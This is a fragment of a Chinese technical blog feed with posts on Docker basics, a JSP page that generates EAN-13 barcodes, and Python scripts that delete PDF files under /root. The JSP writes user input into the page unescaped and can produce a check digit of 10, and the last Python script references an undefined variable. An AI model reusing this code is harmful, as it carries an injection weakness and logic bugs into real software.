<h4 id="查看Docker信息"><a href="#查看Docker信息" class="headerlink" title="查看Docker信息"></a>查看Docker信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">[wb@localhost ~]$ sudo docker info</div><div class="line">[sudo] password for wb: </div><div class="line">Containers: 5</div><div class="line"> Running: 0</div><div class="line"> Paused: 0</div><div class="line"> Stopped: 5</div><div class="line">Images: 5</div><div class="line">Server Version: 1.10.3</div><div class="line">Storage Driver: devicemapper</div><div class="line"> Pool Name: docker-253:0-201516507-pool</div><div class="line"> Pool Blocksize: 65.54 kB</div><div class="line"> Base Device Size: 10.74 GB</div><div class="line"> Backing Filesystem: xfs</div><div class="line"> Data file: /dev/loop0</div><div class="line"> Metadata file: /dev/loop1</div><div class="line"> Data Space Used: 887.2 MB</div><div class="line"> Data Space Total: 107.4 GB</div><div class="line"> Data Space Available: 33.98 GB</div><div class="line"> Metadata Space Used: 1.798 MB</div><div class="line"> Metadata Space Total: 2.147 GB</div><div class="line"> Metadata Space Available: 2.146 GB</div><div class="line"> Udev Sync Supported: true</div><div class="line"> Deferred Removal Enabled: false</div><div class="line"> Deferred Deletion Enabled: false</div><div class="line"> Deferred Deleted Device Count: 0</div><div class="line"> Data loop file: /var/lib/docker/devicemapper/devicemapper/data</div><div class="line"> WARNING: Usage of loopback devices is strongly discouraged for production use. Either use `--storage-opt dm.thinpooldev` or use `--storage-opt dm.no_warn_on_loop_devices=true` to suppress this warning.</div><div class="line"> Metadata loop file: /var/lib/docker/devicemapper/devicemapper/metadata</div><div class="line"> Library Version: 1.02.107-RHEL7 (2016-06-09)</div><div class="line">Execution Driver: native-0.2</div><div class="line">Logging Driver: journald</div><div class="line">Plugins: </div><div class="line"> Volume: local</div><div class="line"> Network: bridge null host</div><div class="line">Kernel Version: 3.10.0-327.el7.x86_64</div><div class="line">Operating System: CentOS Linux 7 (Core)</div><div class="line">OSType: linux</div><div class="line">Architecture: x86_64</div><div class="line">Number of Docker Hooks: 2</div><div class="line">CPUs: 1</div><div class="line">Total Memory: 1.939 GiB</div><div class="line">Name: localhost.localdomain</div><div class="line">ID: U462:5ZLD:UXOI:X37H:T2JO:VDIN:4753:ZJKD:ATQO:5SWY:2UAV:XDL4</div><div class="line">WARNING: bridge-nf-call-iptables is disabled</div><div class="line">WARNING: bridge-nf-call-ip6tables is disabled</div><div class="line">Registries: docker.io (secure)</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;什么是Docker&quot;&gt;&lt;a href=&quot;#什么是Docker&quot; class=&quot;headerlink&quot; title=&quot;什么是Docker&quot;&gt;&lt;/a&gt;什么是Docker&lt;/h4&gt;&lt;p&gt;百度百科：Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。Docker 是 PaaS 提供商 dotCloud 开源的一个基于 LXC 的高级容器引擎，源代码托管在 Github 上, 基于go语言并遵从Apache2.0协议开源。&lt;/p&gt;
&lt;h4 id=&quot;Linux容器技术&quot;&gt;&lt;a href=&quot;#Linux容器技术&quot; class=&quot;headerlink&quot; title=&quot;Linux容器技术&quot;&gt;&lt;/a&gt;Linux容器技术&lt;/h4&gt;&lt;p&gt;Docker引擎的基础是Linux容器（LXC）技术。Docker提供了各种容器管理工具（如开发、版本、移植等）让用户无需关注底层的操作，可以简单明了地管理和使用容器。&lt;/p&gt;
&lt;h4 id=&quot;Docker在开发和运维中的优势&quot;&gt;&lt;a href=&quot;#Docker在开发和运维中的优势&quot; class=&quot;headerlink&quot; title=&quot;Docker在开发和运维中的优势&quot;&gt;&lt;/a&gt;Docker在开发和运维中的优势&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;更快速的交付和部署&lt;/li&gt;
&lt;li&gt;更高效的资源利用（内核级虚拟化，性能更高）&lt;/li&gt;
&lt;li&gt;更轻松的迁移和扩展（几乎可以在任意的平台上运行）&lt;/li&gt;
&lt;li&gt;更简单的更新管理（Dockerfile）&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&quot;Docker与虚拟机的比较&quot;&gt;&lt;a href=&quot;#Docker与虚拟机的比较&quot; class=&quot;headerlink&quot; title=&quot;Docker与虚拟机的比较&quot;&gt;&lt;/a&gt;Docker与虚拟机的比较&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;http://of9x0sxb3.bkt.clouddn.com/blog/20161115/094908295.png&quot; alt=&quot;mark&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://of9x0sxb3.bkt.clouddn.com/blog/20161115/094958563.png&quot; alt=&quot;mark&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;Docker核心概念&quot;&gt;&lt;a href=&quot;#Docker核心概念&quot; class=&quot;headerlink&quot; title=&quot;Docker核心概念&quot;&gt;&lt;/a&gt;Docker核心概念&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Docker镜像&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Docker镜像（Image）类似于虚拟机镜像，可以理解为一个面向Docker引擎的只读模板，包含了文件系统。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Docker容器&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;容器（Container）类似于一个轻量级沙箱，Docker利用容器来运行和隔离应用。容器是从镜像创建的应用运行实例，可以启动，开始，停止，删除。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Docker仓库&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Docker仓库（Repository）类似代码仓库，是Docker集中存放镜像文件的场所。分为公开仓库和私有仓库。&lt;br&gt;
    
    </summary>
    
      <category term="Docker" scheme="http://yoursite.com/categories/Docker/"/>
    
    
      <category term="Docker" scheme="http://yoursite.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Java Web生成EAN13条形码</title>
    <link href="http://yoursite.com/2016/11/13/Java-Web%E7%94%9F%E6%88%90EAN13%E6%9D%A1%E5%BD%A2%E7%A0%81/"/>
    <id>http://yoursite.com/2016/11/13/Java-Web生成EAN13条形码/</id>
    <published>2016-11-13T03:10:35.000Z</published>
    <updated>2016-11-14T07:02:23.681Z</updated>
    
    <content type="html"><![CDATA[<h4 id="EAN13编码原理"><a href="#EAN13编码原理" class="headerlink" title="EAN13编码原理"></a>EAN13编码原理</h4><p>具体详见<a href="http://blog.csdn.net/abcpanpeng/article/details/8130392" target="_blank" rel="external">EAN13编码原理</a>，这里简要概述一下：<br>一个EAN-13条码被划分成了4个区域：1）数制2）厂商码3）商品码4）校验位。通常，第一个数制位被打印在条码的左边，第二个数制位被作为条码下方左手边的那组六位数的第一个字符打印，厂商码是条码下方左手边的后5位数，产品码是条码下方右手边的前五位数，校验位是条码下方右手边的最后一位。<br>以下是典型的EAN-13的条码：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161113/120007864.png" alt="mark"></p>
<ul>
<li>数制：数制是由2位组成的（有些时候是3位），用来区分国家或经济区域制定厂商码的编码权利。</li>
<li>厂商码：厂商码是由数制码标示的编码管理局为每个厂商分配的一个唯一的编码。一个公司的所有产品将使用相同的厂商码。</li>
<li>产品码：产品码是厂商分配的唯一编码。</li>
<li>校验位：校验位是一个附加的位，用来验证一个条码是否被正确的扫描。扫描可能产生不正确的数据，这可能是由于不一致的扫描速度、不完善的打印或一系列其他的问题造成的，因此，有必要验证条码的其余数据已经被正确的诠释。校验位是从条码中其余的数字位中计算得到的。通常，如果校验位和基于已经扫描得到的数据计算出来的校验位的值相同的话，就可以高度的信任条码已经被正确扫描。<a id="more"></a>
</li>
</ul>
<p>计算校验位的步骤如下：</p>
<ol>
<li>将最右边一个数位作为“奇数”位，从右向左为每个字符指定奇数/偶数位。</li>
<li>对所有奇数位上的数值求和，将结构乘以3。</li>
<li>对所有偶数位上的数值求和。</li>
<li>对第2步和第3步计算的结果求和。</li>
<li>校验位的数字加上用第4步计算的总和数应该能够被10整除。</li>
<li>如果第4步计算的总和数能够被10整除，校验位就是“0”（不是10）</li>
</ol>
<h4 id="JSP代码实现"><a href="#JSP代码实现" class="headerlink" title="JSP代码实现"></a>JSP代码实现</h4><p>生成EAN13条形码的库使用的是jbarcode。下载地址：<a href="https://sourceforge.net/projects/jbcode/" target="_blank" rel="external">jbarcode</a></p>
<ul>
<li>JBarcode是一个使用 了Java 2D API条形码图像创建工具，支持EAN13, EAN8, UPCA, UPCE, Code 3 of 9, Codabar, Code 11, Code 93, Code 128, MSI/Plessey, Interleaved 2 of 5, PostNet等）。</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div></pre></td><td class="code"><pre><div class="line">&lt;%@ page language="java" contentType="text/html; charset=GB2312"</div><div class="line">    pageEncoding="GB2312"%&gt;</div><div class="line">&lt;%@ page import="java.awt.image.BufferedImage" %&gt;</div><div class="line">&lt;%@ page import="java.io.FileOutputStream" %&gt;</div><div class="line">&lt;%@ page import="java.io.File" %&gt;</div><div class="line">&lt;%@ page import="org.jbarcode.JBarcode" %&gt;</div><div class="line">&lt;%@ page import="org.jbarcode.util.ImageUtil" %&gt;</div><div class="line">&lt;%@ page import="org.jbarcode.encode.EAN13Encoder" %&gt;</div><div class="line">&lt;%@ page import="org.jbarcode.encode.InvalidAtributeException" %&gt;</div><div class="line">&lt;%@ page import="org.jbarcode.paint.EAN13TextPainter" %&gt;</div><div class="line">&lt;%@ page import="org.jbarcode.paint.WidthCodedPainter" %&gt;</div><div class="line"></div><div class="line">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta http-equiv="Content-Type" content="text/html; charset=GB2312"&gt;</div><div class="line">&lt;title&gt;EAN-13编码&lt;/title&gt;</div><div class="line">&lt;style&gt;</div><div class="line">td&#123;</div><div class="line">	background-color:#eeeeee</div><div class="line">	&#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">	&lt;table border="0" cellpadding="0" cellspacing="2" bgcolor="white" width="410" style="border-right: #000000 1px solid; border-top: #000000 1px solid; font-size: 12px; border-left: #000000 1px solid; border-bottom: #000000 1px solid" ID="Table1"&gt;</div><div class="line">		&lt;tr height="20"&gt;</div><div class="line">			&lt;td width="90"&gt;12位条码数字&lt;/td&gt;</div><div class="line">			&lt;td&gt;</div><div class="line">				&lt;form action="." method="post"&gt;</div><div class="line">				&lt;%</div><div class="line">				String serial = (String)request.getParameter("ipt_12");</div><div class="line">				if(serial == null)</div><div class="line">					serial = "123456789012";</div><div class="line">				String serial_ns = "";</div><div class="line">				String serial_mc = "";</div><div class="line">				String serial_mc_1 = "";</div><div class="line">				String serial_pc = "";</div><div class="line">				String serial_pc_1 = "";</div><div class="line">				String serial_cd = "";</div><div class="line">				String serial_cd_1 = "";</div><div class="line">				String jpg_ean = "";</div><div class="line">				%&gt;</div><div class="line">				&lt;input id="ipt_12" size="12" maxlength="12" value="&lt;%=serial %&gt;" name="ipt_12"&gt;&lt;input id="make" type="submit" value="生成条码" name="make"&gt;</div><div class="line">				&lt;a href="http://blog.csdn.net/FuWaer/archive/2007/09/03/1770317.aspx" target=_blank&gt;EAN-13编码规则&lt;/a&gt;</div><div class="line">				&lt;/form&gt;</div><div class="line">				&lt;% serial = (String)request.getParameter("ipt_12");</div><div class="line">					if(serial != null &amp;&amp; serial.length() == 12)&#123;</div><div class="line">						serial_ns = serial.substring(0,2);</div><div class="line">						serial_mc = serial.substring(2,7);</div><div class="line">						serial_mc_1 = "__" + serial.substring(2,7);</div><div class="line">						serial_pc = serial.substring(7,12);</div><div class="line">						serial_pc_1 = "_______" + serial.substring(7,12);</div><div class="line">						int a = 0;</div><div class="line">						int b = 0;</div><div class="line">						for(int i = 0; i &lt; 12; i++)&#123;</div><div class="line">							if(i%2 == 0)&#123;</div><div class="line">								char c = serial.charAt(i);</div><div class="line">								int x = c - '0';</div><div class="line">								a += x;</div><div class="line">							&#125;else&#123;</div><div class="line">								char d = serial.charAt(i);</div><div class="line">								int y = d - '0';</div><div class="line">								b += y*3;</div><div class="line">							&#125;</div><div class="line">						&#125;</div><div class="line">						int src = 10 - (a + b)%10;</div><div class="line">						serial_cd = src + "";</div><div class="line">						serial_cd_1 = "____________" + src;</div><div class="line">						</div><div class="line">						String path = application.getRealPath(request.getRequestURI());</div><div class="line">						String dir = new File(path).getParent();</div><div class="line">						String jpg_ean_filepath = dir + "\\EAN13.jpg";</div><div class="line">						File file = new File(jpg_ean_filepath);</div><div class="line">						if(file.exists())</div><div class="line">							file.delete();</div><div class="line">						JBarcode jbarcode = new JBarcode(EAN13Encoder.getInstance(), WidthCodedPainter.getInstance(), EAN13TextPainter.getInstance());</div><div class="line">						BufferedImage localBufferedImage = jbarcode.createBarcode(serial);</div><div class="line">						FileOutputStream localFileOutputStream = new FileOutputStream(jpg_ean_filepath);</div><div class="line">						ImageUtil.encodeAndWrite(localBufferedImage, "jpeg", localFileOutputStream, 96, 96); </div><div class="line">						localFileOutputStream.close();</div><div class="line">						jpg_ean = "&lt;img src=\"" + "EAN13.jpg" + "\" height=90%; width=100%;&gt;";</div><div class="line">					&#125;else if(serial != null &amp;&amp; serial.length() != 12)&#123;</div><div class="line">						out.println("&lt;script&gt;alert('Please enter 12 digits!')&lt;/script&gt;");</div><div class="line">					&#125;</div><div class="line">				%&gt;</div><div class="line">			&lt;/td&gt;</div><div class="line">		&lt;/tr&gt;</div><div class="line">		&lt;tr height="20"&gt;</div><div class="line">			&lt;td width="90"&gt;13位EAN-13条码&lt;/td&gt;</div><div class="line">			&lt;td id="td13" style="font-weight: bold; font-size: 14px; letter-spacing: 5px"&gt;&lt;font color=red&gt;&lt;%=serial_ns%&gt;&lt;/font&gt;&lt;font color=blue&gt;&lt;%=serial_mc%&gt;&lt;/font&gt;&lt;font color=brown&gt;&lt;%=serial_pc%&gt;&lt;/font&gt;&lt;font color=green&gt;&lt;%=serial_cd%&gt;&lt;/font&gt;&lt;/td&gt;</div><div class="line">		&lt;/tr&gt;</div><div class="line">		&lt;tr height="20"&gt;</div><div class="line">			&lt;td width="90"&gt;数制码&lt;/td&gt;</div><div class="line">			&lt;td id="td13_ns" style="font-weight: bold; font-size: 14px; letter-spacing: 5px; color:red"&gt;&lt;%=serial_ns%&gt;&lt;/td&gt;</div><div class="line">		&lt;/tr&gt;</div><div class="line">		&lt;tr height="20"&gt;</div><div class="line">			&lt;td width="90"&gt;厂商码&lt;/td&gt;</div><div class="line">			&lt;td id="td13_mc" style="font-weight: bold; font-size: 14px; letter-spacing: 5px; color:blue"&gt;&lt;%=serial_mc_1%&gt;&lt;/td&gt;</div><div class="line">		&lt;/tr&gt;</div><div class="line">		&lt;tr height="20"&gt;</div><div class="line">			&lt;td width="90"&gt;产品码&lt;/td&gt;</div><div class="line">			&lt;td id="td13_pc" style="font-weight: bold; font-size: 14px; letter-spacing: 5px; color:brown"&gt;&lt;%=serial_pc_1%&gt;&lt;/td&gt;</div><div class="line">		&lt;/tr&gt;</div><div class="line">		&lt;tr height="20"&gt;</div><div class="line">			&lt;td width="90"&gt;校验位&lt;/td&gt;</div><div class="line">			&lt;td id="td13_cd" style="font-weight: bold; font-size: 14px; letter-spacing: 5px; color:green"&gt;&lt;%=serial_cd_1%&gt;&lt;/td&gt;</div><div class="line">		&lt;/tr&gt;</div><div class="line">		&lt;tr height="140"&gt;</div><div class="line">			&lt;td width="90"&gt;EAN-13图像&lt;/td&gt;</div><div class="line">			&lt;td id="td13_ean" align=center valign=middle style="background-color:white"&gt;&lt;%=jpg_ean %&gt;&lt;/td&gt;</div><div class="line">		&lt;/tr&gt;</div><div class="line">	&lt;/table&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>项目部署在Tomcat7.0上。运行之后如下图：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161113/120601091.png" alt="mark"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;EAN13编码原理&quot;&gt;&lt;a href=&quot;#EAN13编码原理&quot; class=&quot;headerlink&quot; title=&quot;EAN13编码原理&quot;&gt;&lt;/a&gt;EAN13编码原理&lt;/h4&gt;&lt;p&gt;具体详见&lt;a href=&quot;http://blog.csdn.net/abcpanpeng/article/details/8130392&quot;&gt;EAN13编码原理&lt;/a&gt;，这里简要概述一下：&lt;br&gt;一个EAN-13条码被划分成了4个区域：1）数制2）厂商码3）商品码4）校验位。通常，第一个数制位被打印在条码的左边，第二个数制位被作为条码下方左手边的那组六位数的第一个字符打印，厂商码是条码下方左手边的后5位数，产品码是条码下方右手边的前五位数，校验位是条码下方右手边的最后一位。&lt;br&gt;以下是典型的EAN-13的条码：&lt;br&gt;&lt;img src=&quot;http://of9x0sxb3.bkt.clouddn.com/blog/20161113/120007864.png&quot; alt=&quot;mark&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数制：数制是由2位组成的（有些时候是3位），用来区分国家或经济区域制定厂商码的编码权利。&lt;/li&gt;
&lt;li&gt;厂商码：厂商码是由数制码标示的编码管理局为每个厂商分配的一个唯一的编码。一个公司的所有产品将使用相同的厂商码。&lt;/li&gt;
&lt;li&gt;产品码：产品码是厂商分配的唯一编码。&lt;/li&gt;
&lt;li&gt;校验位：校验位是一个附加的位，用来验证一个条码是否被正确的扫描。扫描可能产生不正确的数据，这可能是由于不一致的扫描速度、不完善的打印或一系列其他的问题造成的，因此，有必要验证条码的其余数据已经被正确的诠释。校验位是从条码中其余的数字位中计算得到的。通常，如果校验位和基于已经扫描得到的数据计算出来的校验位的值相同的话，就可以高度的信任条码已经被正确扫描。
    
    </summary>
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>[python练手]删除文件夹下的pdf文件</title>
    <link href="http://yoursite.com/2016/11/08/python%E7%BB%83%E6%89%8B-%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E7%9A%84pdf%E6%96%87%E4%BB%B6/"/>
    <id>http://yoursite.com/2016/11/08/python练手-删除文件夹下的pdf文件/</id>
    <published>2016-11-08T02:46:38.000Z</published>
    <updated>2016-11-09T02:23:54.353Z</updated>
    
    <content type="html"><![CDATA[<p>结论：如果需要查找子目录，使用<code>os.walk</code>；如果不需要进入子目录，使用<code>os.listdir</code>即可。</p>
<h4 id="删除root目录下的所有pdf文件（包括子目录）"><a href="#删除root目录下的所有pdf文件（包括子目录）" class="headerlink" title="删除root目录下的所有pdf文件（包括子目录）"></a>删除root目录下的所有pdf文件（包括子目录）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/user/bin/python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">searchFiles</span><span class="params">(path)</span>:</span></div><div class="line">	listOfFile = []</div><div class="line">	<span class="keyword">for</span> dirpath, dirnames, filenames <span class="keyword">in</span> os.walk(path):</div><div class="line">		<span class="keyword">for</span> name <span class="keyword">in</span> filenames:</div><div class="line">			<span class="keyword">if</span> name.endswith(<span class="string">'.pdf'</span>):</div><div class="line">				filename = os.path.join(dirpath, name)</div><div class="line">				listOfFile.append(filename)</div><div class="line">	<span class="keyword">return</span> listOfFile</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	path = <span class="string">'/root'</span></div><div class="line">	listOfFile = searchFiles(path)</div><div class="line">	<span class="keyword">print</span> str(len(listOfFile)) + <span class="string">" files to be deleted"</span></div><div class="line">	<span class="keyword">for</span> file <span class="keyword">in</span> listOfFile:</div><div class="line">		os.remove(file)</div></pre></td></tr></table></figure>
<a id="more"></a>
<h4 id="删除root目录下的所有pdf文件（不包括子目录）"><a href="#删除root目录下的所有pdf文件（不包括子目录）" class="headerlink" title="删除root目录下的所有pdf文件（不包括子目录）"></a>删除root目录下的所有pdf文件（不包括子目录）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/user/bin/python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">searchFiles</span><span class="params">(path)</span>:</span></div><div class="line">	listOfFile = []</div><div class="line">	<span class="keyword">for</span> name <span class="keyword">in</span> os.listdir(path):</div><div class="line">		filename = os.path.join(path,name)</div><div class="line">		<span class="keyword">if</span> filename.endswith(<span class="string">'.pdf'</span>):</div><div class="line">			listOfFile.append(filename)</div><div class="line">	<span class="keyword">return</span> listOfFile</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	path = <span class="string">'/root'</span></div><div class="line">	listOfFile = searchFiles(path)</div><div class="line">	<span class="keyword">print</span> str(len(listOfFile)) + <span class="string">" files to be deleted"</span></div><div class="line">	<span class="keyword">for</span> file <span class="keyword">in</span> listOfFile:</div><div class="line">		os.remove(file)</div></pre></td></tr></table></figure>
<h4 id="查找root目录下的所有一年未修改过的pdf文件（遍历子目录）"><a href="#查找root目录下的所有一年未修改过的pdf文件（遍历子目录）" class="headerlink" title="查找root目录下的所有一年未修改过的pdf文件（遍历子目录）"></a>查找root目录下的所有一年未修改过的pdf文件（遍历子目录）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/user/bin/python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> datetime</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">searchFiles</span><span class="params">(path)</span>:</span></div><div class="line">	current_timestamp = time.time()</div><div class="line">	current_time = datetime.datetime.fromtimestamp(current_timestamp)</div><div class="line">	listOfFile = []</div><div class="line">	<span class="keyword">for</span> dirpath, dirnames, filenames <span class="keyword">in</span> os.walk(path):</div><div class="line">		<span class="keyword">for</span> name <span class="keyword">in</span> filenames:</div><div class="line">			<span class="keyword">if</span> name.endswith(<span class="string">'.pdf'</span>):</div><div class="line">				filename = os.path.join(dirpath, name)</div><div class="line">				file_modify_timestamp = os.path.getmtime(filename)</div><div class="line">				file_modify_time = datetime.datetime.fromtimestamp(file_modify_timestamp)</div><div class="line">				<span class="keyword">if</span> (current_time - file_modify_time).days &gt;= <span class="number">365</span>:</div><div class="line">					listOfFile.append(filename)</div><div class="line">	<span class="keyword">return</span> listOfFile</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	path = <span class="string">'/root'</span></div><div class="line">	listOfFile = searchFiles(path)</div><div class="line">	<span class="keyword">print</span> str(len(listOfFile)) + <span class="string">" files to be deleted"</span></div><div class="line">	<span class="keyword">for</span> file <span class="keyword">in</span> listOfFile:</div><div class="line">		<span class="keyword">print</span> filename</div><div class="line">		os.remove(file)</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;结论：如果需要查找子目录，使用&lt;code&gt;os.walk&lt;/code&gt;；如果不需要进入子目录，使用&lt;code&gt;os.listdir&lt;/code&gt;即可。&lt;/p&gt;
&lt;h4 id=&quot;删除root目录下的所有pdf文件（包括子目录）&quot;&gt;&lt;a href=&quot;#删除root目录下的所有pdf文件（包括子目录）&quot; class=&quot;headerlink&quot; title=&quot;删除root目录下的所有pdf文件（包括子目录）&quot;&gt;&lt;/a&gt;删除root目录下的所有pdf文件（包括子目录）&lt;/h4&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span 